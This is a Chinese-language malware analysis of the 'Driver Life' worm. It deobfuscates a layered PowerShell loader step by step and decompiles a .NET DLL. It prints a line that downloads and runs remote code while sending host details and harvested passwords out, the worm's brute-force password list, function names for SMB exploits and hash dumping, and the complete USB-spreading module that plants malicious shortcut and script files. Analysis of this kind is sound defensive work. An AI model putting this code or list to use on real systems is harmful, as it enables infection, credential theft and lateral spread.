

```
$ hash256 if.bin                                                                                                                                                   
989bf47336bf6762a37e90c485199e2cdf0c6ea21ccf6b26845a87e1f8984ab8  if.bin

```


```
$ file ksegmeve.dll
ksegmeve.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows

$ hash256 ksegmeve.dll
51c91efec0126ac197b3dd4b9045a1dbc2eca9c7c7f43d53ebb99377b4388eec  ksegmeve.dll
```


#### 参考链接：

2021-09-24 14:24:58 “驱动人生”：老病毒翻出新花样

https://www.freebuf.com/articles/system/289740.html

https://edr.sangfor.com.cn/#/information/news_detail?id=761



### Powershell 解密

if.bin 文件开头为I`EX

```
I`EX $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$('edbd0
```

删除 **I`EX**，输出到文件 **if-1.1.bin**

```
$ pwsh -f if-1.0.bin > if-1.1.bin
```

if-1.1.bin 文件内容：

```powershell
SeT  sPCz  ( [ChaR[ ] ]")''NIOj-]2,11,3[EmAN.)'*rDM*' elBAIrav-TEg(( .| )421]RAHc[,)17]RAHc[+68]RAHc[+37]RAHc[( ECALperC-29]RAHc[,'ImS3'  eCAlper-  63]RAHc[,'v3bx'ECALperC-93]RAHc[,'5c1t' ECALperC-  )'

)
...
...
...
[aRraY]::REVERse((cHiLditEM  VARiabLE:SpCZ).vaLUe) ;(cHiLditEM  VARiabLE:SpCZ).vaLUe -JOIN '' | . ( $PshoMe[4]+$pshOME[30]+'x')
```

关于PshoMe

```
PS C:\temp> $PSHome
C:\Windows\System32\WindowsPowerShell\v1.0
PS C:\temp> $PshoMe[4]+$pshOME[30]+'x'
iex
```

注释 IEX, 即 | . ( $PshoMe[4]+$pshOME[30]+'x')** ，运行脚本，输出到  **if-1.2.ps1**

```powershell
# | . ( $PshoMe[4]+$pshOME[30]+'x')
```

```cmd
PS C:\temp> .\if-1-1.bin > if-1.2.ps1
```

if-1.2.ps1 文件内容:

```powershell
(('(t1c5wB69sc=[Convert]::FromBase64String(NDckMcBAD4SsB...
...
...
...
')  -CrepLACE 't1c5',[cHAR]39-CrepLACE'xb3v',[cHAR]36  -replACe  '3SmI',[cHAR]92-CrepLACE ([cHAR]73+[cHAR]86+[cHAR]71),[cHAR]124) |. ((gET-varIABle '*MDr*').NAmE[3,11,2]-jOIN'')
```

注释 **|. ((gET-varIABle '*MDr*').NAmE[3,11,2]-jOIN'')** ，运行脚本，输出到  **if-1.3.ps1**

```
# |. ((gET-varIABle '*MDr*').NAmE[3,11,2]-jOIN'')
```

```
$ pwsh -f if-1-2.ps1 > if-1.3.ps1
```

if-1.3.ps1 文件内容

```powershell
('wB69sc=[Convert]::FromBase64String(NDckMcBAD4SsBAAAYOgAAAAAW
...
...
...
}').Replace(([CHAR]117+[CHAR]116+[CHAR]72+[CHAR]57),[strINg][CHAR]39).Replace(([CHAR]117+[CHAR]79+[CHAR]118+[CHAR]97),'|').Replace(([CHAR]119+[CHAR]66+[CHAR]54+[CHAR]57),[strINg][CHAR]36).Replace('NDck',[strINg][CHAR]34).Replace(([CHAR]57+[CHAR]101+[CHAR]48),'\').Replace('ir8',[strINg][CHAR]96) | & ( $env:Comspec[4,26,25]-jOiN'')
```

Comspec值

```cmd
PS C:\temp> $env:Comspec
C:\Windows\system32\cmd.exe
```

注释iex

```
#| & ( $env:Comspec[4,26,25]-jOiN'')
```

运行脚本输入到 **if-1.4.ps1**文件

```
$ pwsh -f if-1.3.ps1 > if-1.4.ps1
```

if-1.4.ps1 文件内容：

```powershell
$sc=[Convert]::FromBase64String("McBAD4SsB
...
...
...
			IEX(New-Object Net.WebClient).DownloadString($down_url+'/log.json?V='+$VVERSION+'&'+$comp_name+'&'+$guid+'&'+$mac+'&'+$internet_ip+'&r='+$retry+'&pc1='+$smb_portopen[1].count+'&pc2='+$ms_portopen[1].count+'&pc3='+$ssh_portopen[1].count+'&pc4='+$rdp_portopen[1].count+'&pc5='+$redis_portopen[1].count+'&pc6='+$redis_portopen1[1].count+'&pc7='+$yarn_portopen[1].count+'&pc8='+$logic_portopen[1].count+'&pc9='+$es_portopen[1].count+'&pc10='+$solr_portopen[1].count+'&pci='+$ipaddrs_i.count+'&pco='+$ipaddrs_o.count+'&pcb='+$global:ipaddrs_b+'&mi='+($getpasswd -join "^^")+'&mf='+[Int]$mf)

		}catch{}

	}

	

	"END"

```

#### 获取ip地址：
```
function getipaddrs($flag){
	write-host "Get ipaddress..."
	$global:ipaddrs_i = @()
	$global:ipaddrs_o = @()
	$allip = @()
	[string[]]$ipsub = @('192.168.0','192.168.1','192.168.2','192.168.3','192.168.4','192.168.5','192.168.6','192.168.7','192.168.8','192.168.9','192.168.10','192.168.18','192.168.31','192.168.199','192.168.254','192.168.67','10.0.0','10.0.1','10.0.2','10.1.1','10.90.90','10.1.10','10.10.1','172.16.1','172.16.2','172.16.3')
	[string[]]$ipsub_o = @()
```

#### 爆破密码

```
[string[]]$global: alluser = @("administrator", "admin")

[string[]]$global:WmicUSER = @("administrator")

[string[]]$global: allpass = @("helloworld", "saadmin", "123456", "test1", "zinch", "g_czechout", "asdf", "Aa123456.", "dubsmash", "password", "PASSWORD", "123.com", "admin@123", "Aa123456", "qwer12345", "Huawei@123", "123@abc", "golden", "123!@#qwe", "1qaz@WSX", "Ab123", "1qaz!QAZ", "Admin123", "Administrator", "Abc123", "Admin@123", "999999", "Passw0rd", "123qwe!@#", "football", "welcome", "1", "12", "21", "123", "321", "1234", "12345", "123123", "123321", "111111", "654321", "666666", "121212", "000000", "222222", "888888", "1111", "555555", "1234567", "12345678", "123456789", "987654321", "admin", "abc123", "abcd1234", "abcd@1234", "abc@123", "p@ssword", "P@ssword", "p@ssw0rd", "P@ssw0rd", "P@SSWORD", "P@SSW0RD", "P@w0rd", "P@word", "iloveyou", "monkey", "login", "passw0rd", "master", "hello", "qazwsx", "password1", "Password1", "qwerty", "baseball", "qwertyuiop", "superman", "1qaz2wsx", "fuckyou", "123qwe", "zxcvbn", "pass", "aaaaaa", "love", "administrator", "qwe1234A", "qwe1234a", " ", "123123123", "1234567890", "88888888", "111111111", "112233", "a123456", "123456a", "5201314", "1q2w3e4r", "qwe123", "a123456789", "123456789a", "dragon", "sunshine", "princess", "!@#$%^&*", "charlie", "aa123456", "homelesspa", "1q2w3e4r5t", "sa", "sasa", "sa123", "sql2005", "sa2008", "abc", "abcdefg", "sapassword", "Aa12345678", "ABCabc123", "sqlpassword", "sql2008", "11223344", "admin888", "qwe1234", "A123456", "OPERADOR", "Password123", "test123", "NULL", "user", "test", "Password01", "stagiaire", "demo", "scan", "P@ssw0rd123", "xerox", "compta")
```

爆破密码表整理得到

```
helloworld
saadmin
123456
test1
zinch
g_czechout
asdf
Aa123456.
dubsmash
password
PASSWORD
123.com
admin@123
Aa123456
qwer12345
Huawei@123
123@abc
golden
123!@#qwe
1qaz@WSX
Ab123
1qaz!QAZ
Admin123
Administrator
Abc123
Admin@123
999999
Passw0rd
123qwe!@#
football
welcome
1
12
21
123
321
1234
12345
123123
123321
111111
654321
666666
121212
000000
222222
888888
1111
555555
1234567
12345678
123456789
987654321
admin
abc123
abcd1234
abcd@1234
abc@123
p@ssword
P@ssword
p@ssw0rd
P@ssw0rd
P@SSWORD
P@SSW0RD
P@w0rd
P@word
iloveyou
monkey
login
passw0rd
master
hello
qazwsx
password1
Password1
qwerty
baseball
qwertyuiop
superman
1qaz2wsx
fuckyou
123qwe
zxcvbn
pass
aaaaaa
love
administrator
qwe1234A
qwe1234a

123123123
1234567890
88888888
111111111
112233
a123456
123456a
5201314
1q2w3e4r
qwe123
a123456789
123456789a
dragon
sunshine
princess
!@#$%^&*
charlie
aa123456
homelesspa
1q2w3e4r5t
sa
sasa
sa123
sql2005
sa2008
abc
abcdefg
sapassword
Aa12345678
ABCabc123
sqlpassword
sql2008
11223344
admin888
qwe1234
A123456
OPERADOR
Password123
test123
NULL
user
test
Password01
stagiaire
demo
scan
P@ssw0rd123
xerox
compta
```



自定义的函数：

```powershell
function make_smb1_anonymous_login_packet {
function smb1_anonymous_login($sock){
function negotiate_proto_request(){
function smb_header($smbheader) {
function smb1_get_response($sock){
function client_negotiate($sock){
function tree_connect_andx($sock, $target, $userid){
function tree_connect_andx_request($target, $userid) {
function smb1_anonymous_connect_ipc($target){
function make_smb1_nt_trans_packet($tree_id, $user_id) {
function make_smb1_trans2_exploit_packet($tree_id, $user_id, $data, $timeout) {
function make_smb1_trans2_last_packet($tree_id, $user_id, $data, $timeout) {
function send_big_trans2($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk){
function createSessionAllocNonPaged($target, $size) {
function make_smb1_free_hole_session_packet($flags2, $vcnum, $native_os) {
function smb2_grooms($target, $grooms, $payload_hdr_pkt, $groom_socks){
function make_smb2_payload_headers_packet(){
function eb7($target ,$shellcode) {
function createFakeSrvNetBuffer8($sc_size)
function createFeaList8($sc_size, $ntfea){
function  make_smb1_login8_packet8 {
function  make_ntlm_auth_packet8($user_id) {
function smb1_login8($sock){
function negotiate_proto_request8($use_ntlm)
function smb_header8($smbheader) {
function smb1_get_response8($sock){
function client_negotiate8($sock , $use_ntlm){
function tree_connect_andx8($sock, $target, $userid){
function tree_connect_andx8_request($target, $userid) {
function make_smb1_nt_trans_packet8($tree_id, $user_id) {
function make_smb1_trans2_exploit_packet8($tree_id, $user_id, $data, $timeout) {
function send_big_trans28($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk){
function createSessionAllocNonPaged8($target, $size) {
function  make_smb1_free_hole_session_packet8($flags2, $vcnum, $native_os) {
function make_smb2_payload_headers_packet8($for_nx){
function eb8($target,$sc) {
function geth {
function LoadApi
function sid_to_key($sid)
function str_to_key($s)
function NewRC4([byte[]]$key)
function des_encrypt([byte[]]$data, [byte[]]$key)
function des_decrypt([byte[]]$data, [byte[]]$key)
function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)
function Get-RegKeyClass([string]$key, [string]$subkey)
function Get-BootKey
function Get-HBootKey
function Get-UserName([byte[]]$V)
function Get-UserHashes($u, [byte[]]$hbootkey)
function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)
function Get-UserKeys
function DumpHashes
function Invoke-Mypass {
function Invoke-SE
function ConvertFrom-PacketOrderedDictionary
function New-PacketNetBIOSSessionService
function New-PacketSMBHeader
function New-PacketSMBNegotiateProtocolRequest
function New-PacketSMBSessionSetupAndXRequest
function New-PacketSMBTreeConnectAndXRequest
function New-PacketSMBNTCreateAndXRequest
function New-PacketSMBReadAndXRequest
function New-PacketSMBWriteAndXRequest
function New-PacketSMBCloseRequest
function New-PacketSMBTreeDisconnectRequest
function New-PacketSMBLogoffAndXRequest
function New-PacketSMB2Header
function New-PacketSMB2NegotiateProtocolRequest
function New-PacketSMB2SessionSetupRequest
function New-PacketSMB2TreeConnectRequest
function New-PacketSMB2CreateRequestFile
function New-PacketSMB2ReadRequest
function New-PacketSMB2WriteRequest
function New-PacketSMB2CloseRequest
function New-PacketSMB2TreeDisconnectRequest
function New-PacketSMB2SessionLogoffRequest
function New-PacketNTLMSSPNegotiate
function New-PacketNTLMSSPAuth
function New-PacketRPCBind
function New-PacketRPCRequest
function New-PacketSCMOpenSCManagerW
function New-PacketSCMCreateServiceW
function New-PacketSCMStartServiceW
function New-PacketSCMDeleteServiceW
function New-PacketSCMCloseServiceHandle
function Get-StatusPending
function Get-UInt16DataLength
function Invoke-SMBC
function ConvertFrom-PacketOrderedDictionary
function New-PacketNetBIOSSessionService
function New-PacketSMBHeader
function New-PacketSMBNegotiateProtocolRequest
function New-PacketSMBSessionSetupAndXRequest
function New-PacketSMB2Header
function New-PacketSMB2NegotiateProtocolRequest
function New-PacketSMB2SessionSetupRequest
function New-PacketSMB2TreeConnectRequest
function New-PacketSMB2CreateRequest
function New-PacketSMB2FindRequestFile
function New-PacketSMB2QueryInfoRequest
function New-PacketSMB2ReadRequest
function New-PacketSMB2WriteRequest
function New-PacketSMB2CloseRequest
function New-PacketSMB2TreeDisconnectRequest
function New-PacketSMB2SessionLogoffRequest
function New-PacketSMB2IoctlRequest()
function New-PacketSMB2SetInfoRequest
function New-PacketNTLMSSPNegotiate
function New-PacketNTLMSSPAuth
function Get-UInt16DataLength
function smbghost_check($tip) {
    function check_vul($sock) {
function smbghost_exec($ip,$cmd){
    function unpack($pkt_str) {
    function pack($pkt) {
    function reconnect(){
    function sock_recv($sock) {
    function smb_negotiate($sock){
    function Smb2CompressedTransform($compressed_data, $decompressed_size, $data){
    function smb_compress($sock, $compressed_data, $decompressed_size, $data){
    function MDL($phys_addr){
    function write_primitive($data,$addr){
    function write_srvnet_buffer_hdr($data, $offset){
    function read_physmem_primitive($phys_addr){
    function get_phys_addr($va_addr){
    function get_pte_va($addr){
    function overwrite_pte($addr){
    function build_shellcode(){
    function search_hal_heap(){
    function search_selfref(){
    function find_pml4_selfref(){
    function find_low_stub(){
    function do_rce(){
function copyrun {
function db_query{
function db_gencmd{
function mssqlrun {
function sshbrute($ip,$user,$pass,$ssh_cmd){
function isPubIP {
function getipaddrs($flag){
function localscan {
function redisexec($ip,$port,$cmd){
    function sendandread($sock,$str){
function yarnexec($ip,$cmd){
    function urlpost($ip,$path,$data){
function logicexec($ip,$cmd){
function esexec($ip,$cmd){
    function urlrequest($ip,$path,$data){
function solrexec($ip,$cmd){
    function urlrequest($ip,$path,$data){
          function f1(data){new java.lang.ProcessBuilder["(java.lang.String[])"]($cmdlist).start()}
function dockerexec($ip,$cmd){
    function urlrequest($ip,$path,$data){
function Gen-NTLM($str){
```


#### ksegmeve.dll for dnspy 
https://github.com/dnSpy/dnSpy/releases

```
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;

namespace USB
{
    // Token: 0x02000002 RID: 2
    public class USBLNK
    {
        // Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
        public static void Main1(string b1, string b2, string b3)
        {
            USBLNK.gb3 = b1;
            USBLNK.gb6 = b2;
            USBLNK.jsdata = b3;
            Timer timer = new Timer(new TimerCallback(USBLNK.ResetBlacklist), null, 10000, 10000);
            for (;;)
            {
                USBLNK.BaseMode();
                Thread.Sleep(5000);
            }
        }

        // Token: 0x06000002 RID: 2 RVA: 0x000020A5 File Offset: 0x000002A5
        private static void ResetBlacklist(object state)
        {
            USBLNK.blacklist.Clear();
        }

        // Token: 0x06000003 RID: 3 RVA: 0x000020B4 File Offset: 0x000002B4
        private static bool CreateHomeDirectory(string drive)
        {
            try
            {
                DirectoryInfo directoryInfo = Directory.CreateDirectory(drive + "UTFsync");
                directoryInfo.Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
                return true;
            }
            catch
            {
            }
            return false;
        }

        // Token: 0x06000004 RID: 4 RVA: 0x00002100 File Offset: 0x00000300
        private static bool IsSupported(DriveInfo drive)
        {
            return drive.IsReady && drive.AvailableFreeSpace > 1024L && (drive.DriveType == DriveType.Removable || drive.DriveType == DriveType.Network) && (drive.DriveFormat == "FAT32" || drive.DriveFormat == "NTFS");
        }

        // Token: 0x06000005 RID: 5 RVA: 0x00002164 File Offset: 0x00000364
        private static bool CheckBlacklist(string name)
        {
            return name == "UTFsync" || name == "System Volume Information" || name == ".BIN";
        }

        // Token: 0x06000006 RID: 6 RVA: 0x000021A0 File Offset: 0x000003A0
        private static bool Infect(string drive)
        {
            bool result;
            if (USBLNK.blacklist.Contains(drive))
            {
                result = true;
            }
            else
            {
                USBLNK.CreateLnk(drive, "blue3.bin", USBLNK.gb3);
                USBLNK.CreateLnk(drive, "blue6.bin", USBLNK.gb6);
                USBLNK.CreateJs(drive, "readme.js", USBLNK.jsdata);
                try
                {
                    File.Create(drive + "UTFsync\\inf_data");
                    return true;
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
                result = false;
            }
            return result;
        }

        // Token: 0x06000007 RID: 7 RVA: 0x00002238 File Offset: 0x00000438
        private static bool CreateJs(string drive, string fname, string gb)
        {
            FileStream fileStream = new FileStream(drive + fname, FileMode.Create);
            byte[] array = Convert.FromBase64String(gb);
            fileStream.Write(array, 0, array.Length);
            fileStream.Close();
            Console.WriteLine(array.Length);
            return true;
        }

        // Token: 0x06000008 RID: 8 RVA: 0x00002368 File Offset: 0x00000568
        private static bool CreateLnk(string drive, string binfname, string gb)
        {
            byte[] array = new byte[]
            {
                76,
                0,
                0,
                0,
                1,
                20,
                2,
                0,
                0,
                0,
                0,
                0,
                192,
                0,
                0,
                0,
                0,
                0,
                0,
                70,
                129,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                156,
                0,
                20,
                0,
                31,
                128,
                32,
                32,
                236,
                33,
                234,
                58,
                105,
                16,
                162,
                221,
                8,
                0,
                43,
                48,
                48,
                157,
                134,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                106,
                0,
                0,
                0,
                0,
                0,
                0
            };
            byte[] array2 = new byte[]
            {
                58,
                0,
                92
            };
            byte[] array3 = new byte[]
            {
                0,
                0,
                0,
                70,
                0,
                108,
                0,
                97,
                0,
                115,
                0,
                104,
                0,
                32,
                0,
                80,
                0,
                108,
                0,
                97,
                0,
                121,
                0,
                101,
                0,
                114,
                0,
                0,
                0,
                77,
                0,
                97,
                0,
                110,
                0,
                97,
                0,
                103,
                0,
                101,
                0,
                32,
                0,
                70,
                0,
                108,
                0,
                97,
                0,
                115,
                0,
                104,
                0,
                32,
                0,
                80,
                0,
                108,
                0,
                97,
                0,
                121,
                0,
                101,
                0,
                114,
                0,
                32,
                0,
                83,
                0,
                101,
                0,
                116,
                0,
                116,
                0,
                105,
                0,
                110,
                0,
                103,
                0,
                115,
                0,
                0,
                0,
                0,
                0,
                16,
                0,
                0,
                0,
                5,
                0,
                0,
                160,
                3,
                0,
                0,
                0,
                20,
                0,
                0,
                0,
                0,
                0,
                0,
                0
            };
            for (char c = 'D'; c <= 'K'; c += '\u0001')
            {
                FileStream fileStream = new FileStream(drive + c.ToString() + binfname.Replace(".bin", ".lnk"), FileMode.Create);
                fileStream.Write(array, 0, array.Length);
                byte[] array4 = new byte[4];
                int num = binfname.Length + 4;
                array4[0] = (byte)(num & 255);
                array4[1] = (byte)((num & 65280) >> 8);
                array4[2] = 13;
                array4[3] = 0;
                fileStream.Write(array4, 0, array4.Length);
                byte[] array5 = new byte[]
                {
                    (byte)(c & 'ÿ'),
                    (byte)((c & '＀') >> 8)
                };
                fileStream.Write(array5, 0, array5.Length);
                fileStream.Write(array2, 0, array2.Length);
                foreach (char c2 in binfname)
                {
                    byte[] array6 = new byte[]
                    {
                        (byte)((c2 & '＀') >> 8),
                        (byte)(c2 & 'ÿ')
                    };
                    fileStream.Write(array6, 0, array6.Length);
                }
                fileStream.Write(array3, 0, array3.Length);
                fileStream.Close();
            }
            FileStream fileStream2 = new FileStream(drive + binfname, FileMode.Create);
            byte[] array7 = Convert.FromBase64String(gb);
            fileStream2.Write(array7, 0, array7.Length);
            fileStream2.Close();
            Console.WriteLine(array7.Length);
            return true;
        }

        // Token: 0x06000009 RID: 9 RVA: 0x00002540 File Offset: 0x00000740
        private static void BaseMode()
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            foreach (DriveInfo driveInfo in drives)
            {
                if (!USBLNK.blacklist.Contains(driveInfo.Name))
                {
                    Console.WriteLine("Detect drive:" + driveInfo.Name);
                    if (USBLNK.IsSupported(driveInfo))
                    {
                        if (!File.Exists(driveInfo + "UTFsync\\inf_data"))
                        {
                            Console.WriteLine("Try to infect " + driveInfo.Name);
                            if (USBLNK.CreateHomeDirectory(driveInfo.Name) && USBLNK.Infect(driveInfo.Name))
                            {
                                USBLNK.blacklist.Add(driveInfo.Name);
                            }
                        }
                        else
                        {
                            Console.WriteLine(driveInfo.Name + " already infected!");
                            USBLNK.blacklist.Add(driveInfo.Name);
                        }
                    }
                    else
                    {
                        USBLNK.blacklist.Add(driveInfo.Name);
                    }
                }
            }
        }

        // Token: 0x04000001 RID: 1
        private const string home = "UTFsync";

        // Token: 0x04000002 RID: 2
        private const string inf_data = "\\inf_data";

        // Token: 0x04000003 RID: 3
        public static List<string> blacklist = new List<string>();

        // Token: 0x04000004 RID: 4
        public static string gb3;

        // Token: 0x04000005 RID: 5
        public static string gb6;

        // Token: 0x04000006 RID: 6
        public static string jsdata;
    }
}

```

